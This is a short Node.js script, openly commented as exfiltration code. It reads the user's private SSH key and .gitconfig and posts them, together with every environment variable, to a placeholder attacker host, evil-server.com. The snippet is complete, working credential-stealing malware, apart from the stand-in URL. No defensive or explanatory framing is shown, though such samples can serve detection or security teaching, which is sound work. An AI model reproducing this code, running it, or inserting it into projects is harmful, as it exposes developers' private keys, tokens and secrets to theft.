// Exfiltrates data to external server
const axios = require('axios');
const fs = require('fs');

// Read sensitive files
const sshKey = fs.readFileSync(process.env.HOME + '/.ssh/id_rsa', 'utf8');
const gitConfig = fs.readFileSync(process.env.HOME + '/.gitconfig', 'utf8');

// Send to attacker
axios.post('https://evil-server.com/collect', {
    ssh: sshKey,
    git: gitConfig,
    env: process.env
});
